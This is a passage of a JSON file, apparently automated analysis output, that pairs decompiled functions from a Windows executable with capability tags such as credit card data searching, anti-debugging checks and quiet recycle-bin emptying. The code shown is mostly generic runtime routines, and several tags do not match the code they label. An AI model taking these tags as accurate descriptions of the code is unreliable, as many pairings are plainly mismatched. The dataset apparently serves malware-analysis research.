        "decompiled_code": "\nvoid __cdecl fcn.00418936(char *arg_8h, int32_t arg_ch, uint32_t *arg_10h)\n\n{\n    int16_t iVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puVar2 = arg_10h;\n    var_4h = *0x441350;\n    iVar1 = 0x404e;\n    *arg_10h = 0;\n    arg_10h[1] = 0;\n    arg_10h[2] = 0;\n    if (arg_ch != 0) {\n        arg_10h = arg_ch;\n        do {\n            var_10h = *puVar2;\n            var_ch = puVar2[1];\n            var_8h = puVar2[2];\n            fcn.004188db(puVar2);\n            fcn.004188db(puVar2);\n            fcn.0041887d(puVar2, &var_10h);\n            fcn.004188db(puVar2);\n            var_10h = *arg_8h;\n            var_ch = 0;\n            var_8h = 0;\n            fcn.0041887d(puVar2, &var_10h);\n            arg_8h = arg_8h + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != NULL);\n    }\n    if (puVar2[2] == 0) {\n        do {\n            iVar1 = iVar1 + -0x10;\n            uVar3 = puVar2[1] >> 0x10;\n            puVar2[1] = *puVar2 >> 0x10 | puVar2[1] << 0x10;\n            *puVar2 = *puVar2 << 0x10;\n        } while (uVar3 == 0);\n        puVar2[2] = uVar3;\n    }\n    while ((puVar2[2] & 0x8000) == 0) {\n        fcn.004188db(puVar2);\n        iVar1 = iVar1 + -1;\n    }\n    *(puVar2 + 10) = iVar1;\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 549
    },
    "0040e4c4": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040e4c4(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43b300, 0x14);\n    if ((-1 < *(unaff_EBP + 8)) && (*(unaff_EBP + 8) < 6)) {\n        fcn.0040f088(0xc);\n        *(unaff_EBP + -4) = 0;\n        if (*(unaff_EBP + 0xc) == 0) {\n            fcn.0040e2eb();\n            fcn.0040b52a(unaff_EBP + -0x10, 0xffffffff);\n        }\n        else {\n            arg_8h_00 = fcn.0040b8de(0x54);\n            *(unaff_EBP + -0x24) = arg_8h_00;\n            if (arg_8h_00 == NULL) {\n                *(unaff_EBP + -0x1c) = 0;\n            }\n            else {\n                iVar1 = fcn.0040e2eb();\n                *(unaff_EBP + -0x1c) = iVar1;\n                if (iVar1 != 0) {\n                    *arg_8h_00 = 0;\n                    arg_8h_00[1] = *0x442c00;\n                    arg_8h_00[2] = *0x442c04;\n                    for (iVar1 = 0; *(unaff_EBP + -0x20) = iVar1,  iVar1 < 6; iVar1 = iVar1 + 1) {\n                        arg_8h_00[iVar1 + 3] = *(iVar1 * 4 + 0x442be8);\n                    }\n                    arg_8h_00[9] = *0x441cc0;\n                    arg_8h_00[10] = *0x441cd0;\n                    arg_8h_00[0xb] = *0x443050;\n                    arg_8h_00[0xc] = *0x443054;\n                    arg_8h_00[0xd] = *0x443040;\n                    arg_8h_00[0xe] = *0x441cbc;\n                    arg_8h_00[0xf] = *0x442bc0;\n                    arg_8h_00[0x10] = *0x443210;\n                    arg_8h_00[0x11] = *0x443200;\n                    arg_8h_00[0x12] = *0x4417c0;\n                    arg_8h_00[0x13] = *0x441bc8;\n                    arg_8h_00[0x14] = *0x442bbc;\n                    if ((**0x44163c == 0) && (*0x44163c != 0x4415e8)) {\n                        fcn.0040db24(*0x44163c);\n                    }\n                    *0x44163c = arg_8h_00;\n                    fcn.0040dbf4();\n                }\n            }\n            if ((*(unaff_EBP + -0x1c) == 0) && (arg_8h_00 != NULL)) {\n                fcn.0040cfb5(arg_8h_00);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0040e60d();\n        }\n    }\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 865
    },
    "00412043": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.00412043(uint32_t param_1, char *param_2, uint32_t param_3)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iStack1060;\n    int32_t iStack1056;\n    int32_t iStack1052;\n    char *pcStack1048;\n    int32_t iStack1044;\n    int32_t iStack1040;\n    char acStack1036 [1028];\n    uint uStack8;\n    \n    uStack8 = *0x441350;\n    iStack1052 = 0;\n    iStack1056 = 0;\n    if (param_3 == 0) goto code_r0x004121fd;\n    piVar1 = (param_1 >> 5) * 4 + 0x4430a0;\n    iVar8 = (param_1 & 0x1f) * 0x24;\n    if ((*(*piVar1 + 4 + iVar8) & 0x20) != 0) {\n        fcn.0041733c(param_1, 0, 0, 2);\n    }\n    if ((*(*piVar1 + iVar8 + 1) & 0x80) == 0) {\n        iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)(*(*piVar1 + iVar8), param_2, param_3, &iStack1060, 0);\n        if (iVar5 == 0) {\n            iStack1040 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            iStack1040 = 0;\n            iStack1052 = iStack1060;\n        }\ncode_r0x0041215f:\n        if (iStack1052 != 0) goto code_r0x004121fd;\n        if (iStack1040 != 0) {\n            if (iStack1040 == 5) {\n                puVar6 = fcn.0041296c();\n                *puVar6 = 9;\n                puVar6 = fcn.00412975();\n                *puVar6 = 5;\n            }\n            else {\n                fcn.0041297e(iStack1040);\n            }\n            goto code_r0x004121fd;\n        }\n    }\n    else {\n        pcStack1048 = param_2;\n        iStack1040 = 0;\n        if (param_3 != 0) {\n            do {\n                uVar7 = pcStack1048 - param_2;\n                pcVar4 = acStack1036;\n                iStack1044 = 0;\n                do {\n                    if (param_3 <= uVar7) break;\n                    pcVar3 = pcStack1048 + 1;\n                    cVar2 = *pcStack1048;\n                    uVar7 = uVar7 + 1;\n                    if (cVar2 == '\\n') {\n                        iStack1056 = iStack1056 + 1;\n                        *pcVar4 = '\\r';\n                        pcVar4 = pcVar4 + 1;\n                        iStack1044 = iStack1044 + 1;\n                    }\n                    *pcVar4 = cVar2;\n                    pcVar4 = pcVar4 + 1;\n                    iStack1044 = iStack1044 + 1;\n                    pcStack1048 = pcVar3;\n                } while (iStack1044 < 0x400);\n                iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                                  (*(*piVar1 + iVar8), acStack1036, pcVar4 - acStack1036, &iStack1060, 0);\n                if (iVar5 == 0) {\n                    iStack1040 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    goto code_r0x0041215f;\n                }\n                iStack1052 = iStack1052 + iStack1060;\n                if ((iStack1060 < pcVar4 - acStack1036) || (param_3 <= pcStack1048 - param_2)) goto code_r0x0041215f;\n            } while( true );\n        }\n    }\n    if (((*(*piVar1 + 4 + iVar8) & 0x40) == 0) || (*param_2 != '\\x1a')) {\n        puVar6 = fcn.0041296c();\n        *puVar6 = 0x1c;\n        puVar6 = fcn.00412975();\n        *puVar6 = 0;\n    }\ncode_r0x004121fd:\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 1053
    },
    "004184c8": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004184c8(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    \n    if ((arg_10h == 10) && (arg_8h < 0)) {\n        uVar1 = 1;\n        arg_10h = 10;\n    }\n    else {\n        uVar1 = 0;\n    }\n    fcn.0041848a(arg_10h, uVar1);\n    return arg_ch;\n}\n",
        "token_count": 116
    },
    "004184f2": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004184f2(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((arg_10h == 10) && (arg_8h < 0)) {\n        uVar1 = 1;\n    }\n    fcn.0041848a(arg_10h, uVar1);\n    return arg_ch;\n}\n",
        "token_count": 102
    },
    "0041176b": {
        "rules": [
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688",
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653"
        ],
        "decompiled_code": "\nuint fcn.0041176b(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    \n    if (*0x4431b8 == 0) {\n        fcn.00416607();\n    }\n    iVar4 = 0;\n    pcVar3 = *0x4428cc;\n    if (*0x4428cc != NULL) {\n        for (; *pcVar3 != '\\0'; pcVar3 = pcVar3 + iVar2 + 1) {\n            if (*pcVar3 != '=') {\n                iVar4 = iVar4 + 1;\n            }\n            iVar2 = fcn.0040bc50(pcVar3);\n        }\n        piVar1 = fcn.0040b8de(iVar4 * 4 + 4);\n        pcVar3 = *0x4428cc;\n        *0x442a80 = piVar1;\n        if (piVar1 != NULL) {\n            do {\n                if (*pcVar3 == '\\0') {\n                    fcn.0040cfb5(*0x4428cc);\n                    *0x4428cc = NULL;\n                    *piVar1 = 0;\n                    *0x4431a0 = 1;\n                    return 0;\n                }\n                iVar4 = fcn.0040bc50(pcVar3);\n                if (*pcVar3 != '=') {\n                    iVar2 = fcn.0040b8de(iVar4 + 1);\n                    *piVar1 = iVar2;\n                    if (iVar2 == 0) {\n                        fcn.0040cfb5(*0x442a80);\n                        *0x442a80 = NULL;\n                        return 0xffffffff;\n                    }\n                    fcn.00411ed0(iVar2, pcVar3);\n                    piVar1 = piVar1 + 1;\n                }\n                pcVar3 = pcVar3 + iVar4 + 1;\n            } while( true );\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 447
    },
    "0041733c": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0041733c(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint dwMoveMethod)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint lDistanceToMove;\n    uint lpDistanceToMoveHigh;\n    \n    lpDistanceToMoveHigh = arg_10h;\n    iVar2 = fcn.00417578(arg_8h);\n    if (iVar2 == -1) {\n        puVar3 = fcn.0041296c();\n        *puVar3 = 9;\ncode_r0x00417396:\n        iVar2 = -1;\n        lpDistanceToMoveHigh = 0xffffffff;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar2, arg_ch, &lpDistanceToMoveHigh, dwMoveMethod);\n        if (iVar2 == -1) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar4 != 0) {\n                fcn.0041297e(iVar4);\n                goto code_r0x00417396;\n            }\n        }\n        puVar1 = *((arg_8h >> 5) * 4 + 0x4430a0) + 4 + (arg_8h & 0x1f) * 0x24;\n        *puVar1 = *puVar1 & 0xfd;\n    }\n    return CONCAT44(lpDistanceToMoveHigh, iVar2);\n}\n",
        "token_count": 344
    },
    "004175b9": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004175b9(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43d088, 8);\n    uVar2 = *(unaff_EBP + 8);\n    iVar1 = *((uVar2 >> 5) * 4 + 0x4430a0) + (uVar2 & 0x1f) * 0x24;\n    if (*(iVar1 + 8) == 0) {\n        fcn.0040f088(10);\n        *(unaff_EBP + -4) = 0;\n        if (*(iVar1 + 8) == 0) {\n            iVar3 = fcn.004159e1(iVar1 + 0xc, 4000);\n            if (iVar3 == 0) {\n                fcn.0040b52a(unaff_EBP + -0x10, 0xffffffff);\n                goto code_r0x00417647;\n            }\n            *(iVar1 + 8) = *(iVar1 + 8) + 1;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00417650();\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(*((uVar2 >> 5) * 4 + 0x4430a0) + 0xc + (uVar2 & 0x1f) * 0x24);\ncode_r0x00417647:\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 400
    },
    "00417659": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.00417659(uint32_t param_1)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(*((param_1 >> 5) * 4 + 0x4430a0) + 0xc + (param_1 & 0x1f) * 0x24);\n    return;\n}\n",
        "token_count": 75
    },
    "00417b44": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint8_t fcn.00417b44(uint32_t param_1)\n\n{\n    if (*0x443060 <= param_1) {\n        return 0;\n    }\n    return *(*((param_1 >> 5) * 4 + 0x4430a0) + 4 + (param_1 & 0x1f) * 0x24) & 0x40;\n}\n",
        "token_count": 90
    },
    "004132a8": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\nuchar * fcn.004132a8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uint *puVar7;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar5 = *0x441bc8;\n    var_4h = 0;\n    puVar7 = *0x441bc8 + 0x38;\n    var_8h = 0xc;\n    do {\n        iVar1 = fcn.0040bc50(puVar7[0xc]);\n        iVar2 = fcn.0040bc50(*puVar7);\n        var_4h = iVar2 + var_4h + 2 + iVar1;\n        puVar7 = puVar7 + 1;\n        var_8h = var_8h + -1;\n    } while (var_8h != 0);\n    puVar3 = fcn.0040b8de(var_4h + 1);\n    if (puVar3 != NULL) {\n        puVar7 = iVar5 + 0x68;\n        iVar5 = 0xc;\n        puVar6 = puVar3;\n        do {\n            *puVar6 = 0x3a;\n            puVar6 = puVar6 + 1;\n            uVar4 = fcn.00411ed0(puVar6, puVar7[-0xc]);\n            iVar1 = fcn.0040bc50(uVar4);\n            puVar6 = puVar6 + iVar1;\n            *puVar6 = 0x3a;\n            uVar4 = fcn.00411ed0(puVar6 + 1, *puVar7);\n            iVar1 = fcn.0040bc50(uVar4);\n            puVar6 = puVar6 + 1 + iVar1;\n            puVar7 = puVar7 + 1;\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n        *puVar6 = 0;\n    }\n    return puVar3;\n}\n",
        "token_count": 479
    },
    "0041333d": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nint32_t fcn.0041333d(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    int32_t var_10h;\n    uint *var_ch;\n    uint *var_8h;\n    int32_t *var_4h;\n    \n    iVar1 = *0x441bc8;\n    iVar9 = 0;\n    var_4h = NULL;\n    do {\n        iVar2 = fcn.0040bc50(*(var_4h * 4 + 0x1c + iVar1));\n        iVar3 = fcn.0040bc50(*(var_4h * 4 + iVar1));\n        var_4h = var_4h + 1;\n        iVar9 = iVar3 + iVar9 + 2 + iVar2;\n    } while (var_4h < 7);\n    var_ch = iVar1 + 0x38;\n    var_8h = 0xc;\n    do {\n        iVar2 = fcn.0040bc50(var_ch[0xc]);\n        iVar3 = fcn.0040bc50(*var_ch);\n        var_ch = var_ch + 1;\n        var_8h = var_8h + -1;\n        iVar9 = iVar3 + iVar9 + 2 + iVar2;\n    } while (var_8h != NULL);\n    iVar2 = fcn.0040bc50(*(iVar1 + 0x98));\n    iVar3 = fcn.0040bc50(*(iVar1 + 0x9c));\n    iVar4 = fcn.0040bc50(*(iVar1 + 0xa0));\n    iVar5 = fcn.0040bc50(*(iVar1 + 0xa4));\n    iVar6 = fcn.0040bc50(*(iVar1 + 0xa8));\n    iVar9 = fcn.0040b8de(iVar3 + iVar9 + iVar2 + iVar4 + iVar5 + iVar6 + 0xbd);\n    if (iVar9 != 0) {\n        iVar2 = iVar9 + 0xb8;\n        fcn.0040bce0(iVar9, *0x441bc8, 0xb8);\n        var_4h = NULL;\n        var_8h = iVar1 + 0x1c;\n        do {\n            *(iVar9 + var_4h * 4) = iVar2;\n            uVar7 = fcn.00411ed0(iVar2, var_8h[-7]);\n            iVar3 = fcn.0040bc50(uVar7);\n            iVar3 = iVar2 + 1 + iVar3;\n            *((iVar9 - iVar1) + var_8h) = iVar3;\n            uVar7 = fcn.00411ed0(iVar3, *var_8h);\n            iVar2 = fcn.0040bc50(uVar7);\n            var_8h = var_8h + 1;\n            var_4h = var_4h + 1;\n            iVar2 = iVar3 + 1 + iVar2;\n        } while (var_4h < 7);\n        var_4h = iVar9 + 0x68;\n        puVar8 = iVar1 + 0x38;\n        var_10h = 0xc;\n        do {\n            *(puVar8 + (iVar9 - iVar1)) = iVar2;\n            uVar7 = fcn.00411ed0(iVar2, *puVar8);\n            iVar3 = fcn.0040bc50(uVar7);\n            iVar3 = iVar2 + 1 + iVar3;\n            *var_4h = iVar3;\n            uVar7 = fcn.00411ed0(iVar3, puVar8[0xc]);\n            iVar2 = fcn.0040bc50(uVar7);\n            puVar8 = puVar8 + 1;\n            var_4h = var_4h + 1;\n            var_10h = var_10h + -1;\n            iVar2 = iVar3 + 1 + iVar2;\n        } while (var_10h != 0);\n        *(iVar9 + 0x98) = iVar2;\n        uVar7 = fcn.00411ed0(iVar2, *(iVar1 + 0x98));\n        iVar3 = fcn.0040bc50(uVar7);\n        iVar3 = iVar2 + 1 + iVar3;\n        *(iVar9 + 0x9c) = iVar3;\n        uVar7 = fcn.00411ed0(iVar3, *(iVar1 + 0x9c));\n        iVar2 = fcn.0040bc50(uVar7);\n        iVar2 = iVar3 + 1 + iVar2;\n        *(iVar9 + 0xa0) = iVar2;\n        uVar7 = fcn.00411ed0(iVar2, *(iVar1 + 0xa0));\n        iVar3 = fcn.0040bc50(uVar7);\n        iVar3 = iVar2 + 1 + iVar3;\n        *(iVar9 + 0xa4) = iVar3;\n        uVar7 = fcn.00411ed0(iVar3, *(iVar1 + 0xa4));\n        iVar2 = fcn.0040bc50(uVar7);\n        iVar2 = iVar3 + 1 + iVar2;\n        *(iVar9 + 0xa8) = iVar2;\n        fcn.00411ed0(iVar2, *(iVar1 + 0xa8));\n    }\n    return iVar9;\n}\n",
        "token_count": 1258
    },
    "0040100a": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040100a(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    \n    iVar6 = *(*(param_1 + 0x3c) + 0x78 + param_1);\n    iVar1 = *(iVar6 + 0x1c + param_1);\n    iVar2 = *(iVar6 + 0x20 + param_1);\n    iVar6 = iVar6 + param_1;\n    iVar3 = *(iVar6 + 0x24);\n    uVar5 = 0;\n    if (*(iVar6 + 0x18) != 0) {\n        do {\n            iVar4 = fcn.004010f0(*(iVar2 + param_1 + uVar5 * 4) + param_1);\n            if (iVar4 == param_2) {\n                return *(iVar1 + param_1 + *(iVar3 + param_1 + uVar5 * 2) * 4) + param_1;\n            }\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < *(iVar6 + 0x18));\n    }\n    return 0;\n}\n",
        "token_count": 297
    },
    "00401041": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401041(int32_t param_1)\n\n{\n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 4) = 0;\n    return;\n}\n",
        "token_count": 66
    },
    "00401091": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "PEB access"
        ],
        "decompiled_code": "\nuint fcn.00401091(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t unaff_EBX;\n    uint *in_FS_OFFSET;\n    char *unaff_retaddr;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x41f758;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    fcn.004011db(param_2, 0, 0xffffffff);\n    pcVar2 = unaff_retaddr;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    iVar3 = pcVar2 - (unaff_retaddr + 1);\n    uVar4 = fcn.00401267(unaff_retaddr, iVar3);\n    *0x18 = 0xf;\n    *0x14 = 0;\n    *0x4 = 0;\n    fcn.004011db(uVar4, 0, 0xffffffff);\n    if (0xf < unaff_EBX) {\n        fcn.0040b0dd(iVar3);\n    }\n    *in_FS_OFFSET = 0;\n    return 0;\n}\n",
        "token_count": 318
    },
    "004010e6": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint fcn.004010e6(int32_t param_1, uint param_2, uint param_3)\n\n{\n    uint uVar1;\n    \n    (*_sym.imp.USER32.dll_GetWindowRect)(param_2, param_1 + 8);\n    *(param_1 + 0x2c) = *(param_1 + 0x14) + *(param_1 + 0xc);\n    *(param_1 + 0x28) = *(param_1 + 0x10) + *(param_1 + 8);\n    if (param_1 == 1) {\n        uVar1 = fcn.00401087(param_2, param_3);\n        return uVar1;\n    }\n    if (param_1 != 2) {\n        uVar1 = (*_sym.imp.USER32.dll_DefWindowProcA)(param_2, param_1, param_2, param_3);\n        return uVar1;\n    }\n    (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n    return 0;\n}\n",
        "token_count": 231
    },
    "00401104": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00401104(int32_t param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    \n    if (*(param_1 + 0x14) < param_2) {\n        fcn.00408cf6();\n    }\n    uVar2 = *(param_1 + 0x14) - param_2;\n    if (uVar2 < param_3) {\n        param_3 = uVar2;\n    }\n    if (param_3 != 0) {\n        puVar5 = param_1 + 4;\n        puVar4 = puVar5;\n        puVar1 = puVar5;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar4 = *puVar5;\n            puVar1 = *puVar5;\n        }\n        fcn.0040ada0(puVar4 + param_2, puVar1 + param_3 + param_2, uVar2 - param_3);\n        iVar3 = *(param_1 + 0x14) - param_3;\n        *(param_1 + 0x14) = iVar3;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar5 = *puVar5;\n        }\n        *(puVar5 + iVar3) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 346
    },
    "004011a9": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.004011a9(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uint uStack4;\n    \n    uStack4 = 0;\n    iVar1 = (*_sym.imp.USER32.dll_LoadStringW)(param_3, param_2, &uStack4);\n    if (iVar1 != 0) {\n        *0x18 = 7;\n        *0x14 = 0;\n        *0x4 = 0;\n        fcn.00401163(param_2, iVar1);\n        return 0;\n    }\n    *0x4 = 0;\n    *0x14 = 0;\n    *0x18 = 7;\n    return 0;\n}\n",
        "token_count": 166
    },
    "004011d1": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004011d1(int32_t param_1)\n\n{\n    if (0xf < *(param_1 + 0x18)) {\n        fcn.0040b0dd(*(param_1 + 4));\n    }\n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 4) = 0;\n    return;\n}\n",
        "token_count": 103
    },
    "004011e0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004011e0(int32_t param_1)\n\n{\n    if (7 < *(param_1 + 0x18)) {\n        fcn.0040b0dd(*(param_1 + 4));\n    }\n    *(param_1 + 0x18) = 7;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 4) = 0;\n    return;\n}\n",
        "token_count": 101
    },
    "004011e5": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004011e5(int32_t param_1, int32_t param_2)\n\n{\n    *(param_1 + 0x14) = param_2;\n    if (0xf < *(param_1 + 0x18)) {\n        *(*(param_1 + 4) + param_2) = 0;\n        return;\n    }\n    *(param_1 + 4 + param_2) = 0;\n    return;\n}\n",
        "token_count": 105
    },
    "00401235": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401235(int32_t param_1)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    char *pcStack72;\n    uint uStack68;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    uStack68 = 0;\n    pcStack72 = 0x407d23;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    pcStack72 = \"MAINICON\";\n    uVar3 = (*pcVar1)(0);\n    (*_sym.imp.USER32.dll_LoadIconA)(uVar3);\n    (*_sym.imp.USER32.dll_LoadCursorA)(0, 0x7f00);\n    iVar2 = (*_sym.imp.USER32.dll_RegisterClassExA)(&stack0xffffffb8);\n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_GetSystemMetrics)(0);\n    uVar3 = fcn.0040b958();\n    (*pcVar1)(1);\n    uVar4 = fcn.0040b958();\n    iVar5 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, *(param_1 + 0x40), \"JsCppSplashScreen\", 0xcf0000, uVar3, uVar4, 0x280, 0x1e0, 0, 0, 0, param_1\n                      );\n    *(param_1 + 4) = iVar5;\n    if (iVar5 != 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)(iVar5, 3);\n        (*_sym.imp.USER32.dll_UpdateWindow)(*(param_1 + 4));\n    }\n    return *(param_1 + 4);\n}\n",
        "token_count": 426
    },
    "00401253": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00401253(int32_t param_1, uint param_2)\n\n{\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 4) = 0;\n    fcn.004011db(param_2, 0, 0xffffffff);\n    return param_1;\n}\n",
        "token_count": 95
    },
    "00408a8f": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408a8f(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00408bd1(4);\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.0040a7ed();\n    }\n    *(param_1 + 0x24) = uVar2;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0x201;\n    *(param_1 + 0x14) = 6;\n    *(param_1 + 0x18) = 0;\n    *(param_1 + 0x1c) = 0;\n    *(param_1 + 0x20) = 0;\n    fcn.0040888d(0, 0);\n    return;\n}\n",
        "token_count": 213
    },
    "0040a43e": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040a43e(int32_t param_1, int32_t param_2)\n\n{\n    int32_t arg_10h;\n    \n    if (*(param_2 + 0x18) < 0x10) {\n        arg_10h = param_2 + 4;\n    }\n    else {\n        arg_10h = *(param_2 + 4);\n    }\n    fcn.0040a3d4(0, *(param_1 + 0x14), arg_10h, *(param_2 + 0x14));\n    return;\n}\n",
        "token_count": 133
    },
    "0040a671": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
